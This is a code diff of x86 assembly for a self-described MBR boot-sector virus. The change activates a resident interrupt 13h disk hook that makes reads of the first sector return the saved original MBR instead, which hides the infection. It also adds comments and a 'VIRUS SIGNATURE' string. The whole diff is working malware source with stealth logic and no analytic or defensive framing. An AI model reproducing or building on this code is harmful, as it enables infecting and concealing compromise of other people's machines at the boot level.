@@ -69,51 +69,36 @@ cpy_original:                   ; this code will copy original MBR to 0x7c00
   call wr_sector                ; copy orignal MBR
 
   ; before we jump into org mbr, let's hook int 13h
-  mov ax, word [0x13*4]
-  mov bx, word [0x13*4+2]
-  mov [oldint13-cpy_original+0xF000], ax
-  mov [oldint13-cpy_original+0xF000+2], bx
+  mov ax, word [0x13*4]                         ; get old 13h vector (offset)
+  mov bx, word [0x13*4+2]                       ; get old 13h vector (segment)
+  mov [oldint13-cpy_original+0xF000], ax        ; save old interrupt offset
+  mov [oldint13-cpy_original+0xF000+2], bx      ; save old interrupt segment
   mov ax, dsk_hook
   sub ax, cpy_original
-  add ax, 0xF000
+  add ax, 0xF000                                ; calculate disk hook address
   mov word [0x13*4], ax
-  mov word [0x13*4+2], 0
-  ;mov ah, 0x02
-  ;mov al, 0x01
-  ;mov cx, 0x0002
-  ;mov bx, 0x8000
-  ;call wr_sector
-  mov ax, 0xaa55
-  jmp 0x0:0x7c00                  ; far jump to the original MBR
+  mov word [0x13*4+2], 0                        ; save new adress to 13h vector
+  jmp 0x0:0x7c00                                ; far jump to the original MBR
 
+; disk hook that will resident in memory
 dsk_hook:
-  ;nop
-  ;push cx
-  ;pushf
-  ;cmp ah, 0x02
-  ;jne .end_hook
-  ;cmp cx, 0x0001
-  ;jne .end_hook
-  ;mov cx, 0x0001
-;.end_hook:
-  ;popf
-  pushf
-  ;push cs
-  ;push cx
-  push word [cs:oldint13-cpy_original+0xF000+2]
-  push word [cs:oldint13-cpy_original+0xF000]
-  retf
-
-  ;call far [cs:oldint13-cpy_original+0xF000]
-  ;pop cx
-  ;pop cx
-  ;pop cx
+  pushf                                         ; push flags
+  cmp ah, 0x02                                  ; check if read access
+  jne .end_hook
+  cmp cx, 0x0001                                ; check if 1st sector
+  jne .end_hook
+  mov cx, 0x0002                                ; change it to original MBR
+.end_hook:
+  popf
+  push word [cs:oldint13-cpy_original+0xF000+2] ; push segment
+  push word [cs:oldint13-cpy_original+0xF000]   ; push offset
+  retf                                          ; call original handler
   sti
   iret
 
 
 oldint13:
-  dd 45                   ; var for saving int13 address
+  dd 45                                         ; var for saving int13 address
 
 ; write/read sector on disk, based on
 ; ah = 0x02 read, ah = 0x03 write
@@ -135,18 +120,14 @@ wr_sector:
 
 end_cpy:                         ; end of code for copying original MBR
 
-
-;times (218 - ($-$$)) nop      ; Pad for disk time stamp
-
-;DiskTimeStamp times 8 db 0    ; Disk Time Stamp
-
 bootDrive db 0                ; Our Drive Number Variable
 disk_codes:                   ; available drives variable
   db 0x0                      ; first floppy disk
   db 0x1                      ; second floppy disk
   db 0x80                     ; first hard disk
   db 0x81                     ; second hard disk
-sig dw 0xDEAD
+sig dw 0xDEAD                 ; very creative signature
+db "VIRUS SIGNATURE.$"        ; for easier to see when seeing MBR code
 
 times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table
 
